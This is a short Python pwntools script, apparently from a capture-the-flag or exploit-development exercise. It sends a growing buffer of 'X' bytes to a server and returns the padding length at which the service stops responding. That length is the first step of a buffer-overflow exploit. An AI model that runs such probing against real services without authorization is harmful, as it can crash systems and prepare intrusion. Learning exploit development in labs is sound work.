#!/usr/bin/env python3

from pwn import *
from utils import connect, disconnect

timeout = 0.1


def getPadding():
    i = 0 # counter

    while True:
        # connect to server and wait for prompt
        r = connect()
        r.recv(timeout=timeout)

        # send the growing buffer
        i += 1
        pld = b'X' * i
        r.send(pld)

        # check output
        try:
            output = r.recv(timeout=timeout)
            disconnect(r)
            if output:
                log.info(f'{i} -> {output}')
        except:
            log.warn(f'no output -> overflow when padding = {i}')
            return i-1 # -1 because we want the padding size
